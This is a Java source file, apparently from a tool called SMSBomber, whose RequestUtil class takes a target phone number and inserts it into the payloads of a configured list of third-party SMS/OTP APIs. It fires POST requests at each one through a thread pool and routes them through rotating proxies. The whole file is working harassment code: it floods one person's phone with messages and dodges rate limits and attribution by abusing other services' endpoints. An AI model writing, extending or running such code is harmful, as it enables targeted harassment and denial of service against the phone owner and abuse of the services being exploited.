package ir.mrsf.smsbomber.utils;

import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import ir.mrsf.smsbomber.SMSBomber;
import ir.mrsf.smsbomber.models.API;
import lombok.experimental.UtilityClass;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.function.Consumer;

@UtilityClass
public class RequestUtil {
    private static final Gson gson;

    static {
        gson = new Gson();
    }

    public void sendSMSRequest(ExecutorService executor, String phone) {
        try {

            final List<API> apiList = SMSBomber.getSmsBomber().getConfigManager().getApiList();
            for (API api : apiList) {
                final JsonObject body = new JsonObject();
                final JsonObject payload = api.getPayload();
                for (String key : payload.keySet()) {
                    final JsonElement phonePayload = payload.get(key);
                    if (phonePayload instanceof JsonPrimitive jsonPrimitive && jsonPrimitive.isString()) {
                        body.addProperty(key, jsonPrimitive.getAsString().replaceAll("%phone%", phone));
                        continue;
                    }
                    body.add(key, phonePayload);
                }
                System.out.println(body);
                executor.submit(() -> {
                    smsRequest(api.getUrl().replaceAll("%phone%", phone), body,
                            (integer) -> {
                                sendLog(api.getName(), integer);
                            }
                    );
                });
                Thread.sleep(500);
            }
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private void sendLog(String name, int responseCode) {
        if (responseCode == HttpURLConnection.HTTP_OK) {
            System.out.println("Sent from: " + name);
        } else {
            System.out.println("Failed to send: " + name);
        }
    }

    private void smsRequest(String url, JsonObject header, Consumer<Integer> callback) {
        try {
            Thread.sleep(3000);
            final String jsonData = gson.toJson(header);
            byte[] postData = jsonData.getBytes(StandardCharsets.UTF_8);
            final HttpURLConnection conn = getHttpURLConnectionSMS(url, postData);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(postData);
            }

            callback.accept(conn.getResponseCode());
            Thread.sleep(3000);
        } catch (Exception e) {
            callback.accept(500);
        }
    }


    private HttpURLConnection getHttpURLConnectionSMS(String url, byte[] postData) throws IOException {
        final HttpURLConnection conn = (HttpURLConnection) new URL(url).
                openConnection(SMSBomber.getSmsBomber().getProxyManager().getNextProxy());
        conn.setDoOutput(true);
        conn.setInstanceFollowRedirects(false);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("charset", "utf-8");
        conn.setRequestProperty("Content-Length", Integer.toString(postData.length));
        conn.setUseCaches(false);
        return conn;
    }
}
